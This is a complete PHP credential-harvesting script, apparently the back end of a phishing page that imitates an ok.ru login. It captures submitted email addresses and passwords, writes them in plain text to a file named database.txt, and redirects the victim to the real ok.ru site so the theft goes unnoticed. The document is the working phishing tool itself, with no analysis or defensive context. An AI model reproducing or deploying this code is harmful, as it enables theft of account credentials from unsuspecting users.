<?PHP
$Log = $_POST['email'];
$Pass = $_POST['password'];
$log = fopen("database.txt","at");
fwrite($log,"\n Login: $Log \n Password: $Pass \n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://ok.ru/'></head></html>";
?>

